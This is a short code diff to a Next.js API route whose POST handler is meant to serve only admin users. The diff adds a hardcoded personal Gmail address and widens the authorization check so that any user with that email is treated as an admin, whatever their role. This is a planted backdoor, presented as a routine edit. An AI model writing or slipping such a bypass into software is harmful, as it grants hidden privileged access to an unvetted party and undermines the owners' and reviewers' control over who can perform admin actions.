@@ -5,7 +5,9 @@ import { fail, ok } from "@/services/http/response";
 
 export async function POST(req: NextRequest) {
   const admin = await getUserFromRequest(req);
-  if (!admin || admin.role !== "admin") {
+  const OWNER_EMAIL = "emil578jvcvn@gmail.com";
+  
+  if (!admin || (admin.role !== "admin" && admin.email !== OWNER_EMAIL)) {
     return fail("UNAUTHORIZED", "Only admins can perform this action", 403);
   }
 
